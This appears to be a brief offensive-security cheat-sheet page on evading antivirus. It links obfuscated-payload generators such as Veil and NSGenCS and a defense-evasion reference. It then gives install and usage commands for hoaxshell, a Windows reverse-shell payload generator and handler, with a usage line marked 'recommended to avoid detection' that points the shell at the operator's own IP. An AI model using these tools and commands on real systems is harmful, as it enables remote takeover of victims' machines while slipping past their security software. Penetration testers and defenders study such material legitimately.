# Antivirus

## Obfuscated payloads

{% embed url="https://github.com/t3hbb/NSGenCS" %}

{% embed url="https://github.com/Veil-Framework/Veil" %}
Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions.
{% endembed %}

{% embed url="https://www.ired.team/offensive-security/defense-evasion" %}
Check these
{% endembed %}

## HoaxShell

{% embed url="https://github.com/t3l3machus/hoaxshell" %}

> hoaxshell is a Windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell.

```bash
# install
git clone https://github.com/t3l3machus/hoaxshell
cd ./hoaxshell
sudo pip3 install -r requirements.txt
chmod +x hoaxshell.py

# usage 
# recommended to avoid detection
python3 hoaxshell.py -s <your_ip> -i -H "Authorization"
```
